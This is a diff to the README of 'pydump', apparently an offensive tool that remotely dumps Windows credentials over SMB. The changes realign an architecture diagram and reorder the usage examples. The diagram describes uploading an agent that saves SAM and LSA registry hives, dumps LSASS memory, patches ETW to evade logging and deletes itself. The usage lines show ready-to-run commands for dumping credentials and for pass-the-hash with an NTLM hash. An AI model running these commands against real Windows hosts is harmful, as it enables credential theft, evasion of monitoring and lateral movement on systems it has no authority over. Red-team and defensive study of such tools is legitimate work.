@@ -35,11 +35,11 @@ registry or process access from the network.
 ```
 ORCHESTRATOR (Linux/Python)                   TARGET (Windows)
 ┌──────────────────────┐         SMB 445      ┌──────────────────────┐
-│  pydump CLI          │◄───────────────────►│                      │
+│  pydump CLI          │◄────────────────────►│                      │
 │                      │                      │  SVCCTL → Service    │
 │  ┌─ agent output ──┐ │   upload + execute   │  ┌─────────────────┐ │
-│  │ hives → decrypt  │ │─────────────────────►│  │ agent.exe       │ │
-│  │ LSASS → parse    │ │◄─────────────────────│  │ RegSaveKey      │ │
+│  │ hives → decrypt │ │─────────────────────►│  │ agent.exe       │ │
+│  │ LSASS → parse   │ │◄─────────────────────│  │ RegSaveKey      │ │
 │  └─────────────────┘ │   named pipe stream  │  │ LSASS dump      │ │
 │                      │   (hives + MDMP)     │  │ ETW patch       │ │
 │                      │                      │  │ self-delete     │ │
@@ -96,10 +96,10 @@ Dependencies: `smbprotocol` + `pycryptodome` only.
 
 ```bash
 # Pick what you need
-python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
 python main.py -t 10.0.0.5 -u admin -p pass --sam
-python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
+python main.py -t 10.0.0.5 -u admin -p pass --lsa
 python main.py -t 10.0.0.5 -u admin -p pass --lsass
+python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
 
 # Pass-the-Hash
 python main.py -t 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee --sam
